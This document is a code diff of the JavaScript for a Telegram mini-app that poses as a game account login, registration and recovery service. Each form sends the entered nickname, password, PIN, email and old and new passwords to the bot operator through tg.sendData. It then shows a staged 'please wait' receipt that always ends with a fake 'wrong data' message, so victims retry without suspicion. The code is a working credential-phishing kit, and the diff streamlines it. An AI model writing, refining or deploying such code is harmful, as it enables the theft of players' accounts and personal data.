@@ -2,6 +2,7 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
+// === ЗАГРУЗКА ===
 let percent = 0;
 const bar = document.getElementById('bar');
 const percentText = document.getElementById('percent');
@@ -24,6 +25,19 @@ if (loader && main) {
     }, 30);
 }
 
+function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
+function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
+
+function checkNick() {
+    const nick = document.getElementById('nick').value.trim();
+    const icon = document.getElementById('iconNick');
+    if (!icon) return;
+    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
+    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
+    else { icon.classList.remove('green'); icon.classList.add('red'); }
+}
+function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
+
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
     const pinInput = document.getElementById('pin');
@@ -42,120 +56,6 @@ function togglePin() {
     }
 }
 
-function onlyEnglish(input) {
-    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
-}
-
-function onlyPin(input) {
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
-}
-
-// === ПРОВЕРКА НИКА ===
-function checkNick() {
-    const nick = document.getElementById('nick').value.trim();
-    const icon = document.getElementById('iconNick');
-    if (!icon) return;
-    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
-    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
-    else { icon.classList.remove('green'); icon.classList.add('red'); }
-}
-
-function markFilled(inputId, iconId) {
-    const input = document.getElementById(inputId);
-    const icon = document.getElementById(iconId);
-    if (!input || !icon) return;
-    input.addEventListener('input', () => {
-        if (input.value.trim() !== '') { icon.classList.remove('red'); icon.classList.add('green'); }
-        else { icon.classList.remove('green'); icon.classList.add('red'); }
-    });
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    markFilled('password', 'iconPass');
-    markFilled('pin', 'iconPin');
-    markFilled('email', 'iconEmail');
-    markFilled('referrer', 'iconRef');
-    markFilled('old_password', 'iconOldPass');
-    markFilled('new_password', 'iconNewPass');
-});
-
-function showLoading(text, callback) {
-    const loaderDiv = document.createElement('div');
-    loaderDiv.className = 'loader-screen';
-    loaderDiv.id = 'tempLoader';
-    loaderDiv.innerHTML = `<div class="loader-circle"></div><div class="loader-text">${text}</div><div class="loader-percent" id="tempPercent">0%</div><div class="loader-bar"><div class="loader-bar-fill" id="tempBar"></div></div>`;
-    document.body.appendChild(loaderDiv);
-    let p = 0;
-    const int = setInterval(() => {
-        p += 2;
-        if (p >= 100) {
-            p = 100;
-            clearInterval(int);
-            setTimeout(() => { loaderDiv.remove(); if (callback) callback(); }, 300);
-        }
-        const tempBar = document.getElementById('tempBar');
-        const tempPercent = document.getElementById('tempPercent');
-        if (tempBar) tempBar.style.width = p + '%';
-        if (tempPercent) tempPercent.textContent = p + '%';
-    }, 30);
-}
-
-let pendingData = null;
-function sendToBot(text) { pendingData = text; }
-
-function closeSuccess() {
-    if (pendingData) { try { tg.sendData(pendingData); } catch (e) { console.error(e); } }
-    tg.close();
-}
-
-function showSuccess(text, nick, server, type) {
-    const now = new Date();
-    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
-    const ticket = Math.floor(1000000 + Math.random() * 9000000);
-    const overlay = document.createElement('div');
-    overlay.className = 'success-overlay';
-    overlay.innerHTML = `
-        <div class="success-box">
-            <div class="success-header">
-                <div class="success-ticket">#${ticket}</div>
-                <div class="success-time">${time}</div>
-            </div>
-            <div class="success-body">
-                <div class="success-row"><span class="success-label">НИК</span><span class="success-value">${nick}</span></div>
-                <div class="success-row"><span class="success-label">ОПЕРАЦИЯ</span><span class="success-value">${type}</span></div>
-                <div class="success-row"><span class="success-label">СЕРВЕР</span><span class="success-value">${server}</span></div>
-            </div>
-            <div class="success-wait-static">Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span></div>
-            <button class="success-close-btn" onclick="closeSuccess()">ЗАКРЫТЬ</button>
-        </div>
-    `;
-    document.body.appendChild(overlay);
-    let counter = 15;
-    let dotIndex = 0;
-    const dots = ['', '.', '..', '...'];
-    const waitNum = document.getElementById('waitNum');
-    const waitDots = document.getElementById('waitDots');
-    const waitStatic = document.querySelector('.success-wait-static');
-    const interval = setInterval(() => {
-        counter--;
-        dotIndex = (dotIndex + 1) % 4;
-        if (counter > 0) {
-            if (waitNum) waitNum.textContent = counter;
-            if (waitDots) waitDots.textContent = dots[dotIndex];
-        } else {
-            clearInterval(interval);
-            if (waitStatic) {
-                waitStatic.textContent = 'Вы ввели неверные данные попробуйте снова';
-                waitStatic.style.color = '#a01010';
-                waitStatic.style.fontWeight = '700';
-            }
-        }
-    }, 300);
-}
-
-function goTo(page) { window.location.href = page; }
-function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
-
 function toggleServerList() {
     const dropdown = document.getElementById('serverDropdown');
     if (dropdown) dropdown.classList.toggle('active');
@@ -168,22 +68,81 @@ function selectServer(value) {
     toggleServerList();
 }
 
+function sendToBot(text) {
+    try { tg.sendData(text); } catch (e) { console.error(e); }
+}
+
+// === ЧЕК ===
+function showReceipt(nick, server, type) {
+    const now = new Date();
+    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+    const ticket = Math.floor(1000000 + Math.random() * 9000000);
+
+    const overlay = document.createElement('div');
+    overlay.className = 'receipt-overlay';
+    overlay.innerHTML = `
+        <div class="receipt-box">
+            <div class="receipt-close" onclick="closeReceipt()">✕</div>
+            <div class="receipt-header">
+                <span class="receipt-ticket">#${ticket}</span>
+                <span class="receipt-time">${time}</span>
+            </div>
+            <div class="receipt-body">
+                <div class="receipt-row"><span class="receipt-label">НИК</span><span class="receipt-value">${nick}</span></div>
+                <div class="receipt-row"><span class="receipt-label">СЕРВЕР</span><span class="receipt-value">${server}</span></div>
+                <div class="receipt-row"><span class="receipt-label">ОПЕРАЦИЯ</span><span class="receipt-value">${type}</span></div>
+            </div>
+            <div class="receipt-status" id="receiptStatus">
+                <div class="receipt-status-text" id="statusText">Пожалуйста подождите...</div>
+                <div class="receipt-bar"><div class="receipt-bar-fill" id="receiptBar"></div></div>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(overlay);
+
+    let counter = 0;
+    const bar = document.getElementById('receiptBar');
+    const statusText = document.getElementById('statusText');
+
+    const interval = setInterval(() => {
+        counter += 1;
+        if (counter >= 100) {
+            counter = 100;
+            clearInterval(interval);
+            if (statusText) {
+                statusText.textContent = 'Вы ввели неверные данные';
+                statusText.style.color = '#6a0000'; // ТЁМНО-КРАСНЫЙ
+                statusText.style.fontWeight = '700';
+            }
+        }
+        if (bar) bar.style.width = counter + '%';
+    }, 150);
+}
+
+function closeReceipt() {
+    const overlay = document.querySelector('.receipt-overlay');
+    if (overlay) overlay.remove();
+    tg.close();
+}
+
+function goTo(page) { window.location.href = page; }
+
+// === ВХОД ===
 function login() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
     if (!nick) { alert('Введите ник!'); return; }
-    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
-    sendToBot(`🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
-    showLoading('ПРОВЕРКА ДАННЫХ', () => {
-        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('', nick, server, 'Вход в аккаунт');
-        });
-    });
+
+    const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
+    sendToBot(data);
+    showReceipt(nick, server, 'Вход в аккаунт');
 }
 
+// === РЕГИСТРАЦИЯ ===
 function register() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -192,16 +151,15 @@ function register() {
     const server = document.getElementById('server').value;
     const referrer = document.getElementById('referrer').value.trim();
     if (!nick) { alert('Введите ник!'); return; }
-    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!password) { alert('Введите пароль!'); return; }
-    sendToBot(`📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`);
-    showLoading('ПРОВЕРКА ДАННЫХ', () => {
-        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('', nick, server, 'Создание аккаунта');
-        });
-    });
+
+    const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
+    sendToBot(data);
+    showReceipt(nick, server, 'Создание аккаунта');
 }
 
+// === ВОССТАНОВЛЕНИЕ ===
 function recover() {
     const nick = document.getElementById('nick').value.trim();
     const oldPass = document.getElementById('old_password').value.trim();
@@ -209,13 +167,11 @@ function recover() {
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
     if (!nick) { alert('Введите ник!'); return; }
-    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone (минимум 5 символов, только буквы)!'); return; }
+    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
     if (!newPass) { alert('Введите новый пароль!'); return; }
-    sendToBot(`🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
-    showLoading('ПРОВЕРКА ДАННЫХ', () => {
-        showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('', nick, server, 'Восстановление аккаунта');
-        });
-    });
+
+    const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
+    sendToBot(data);
+    showReceipt(nick, server, 'Восстановление аккаунта');
 }
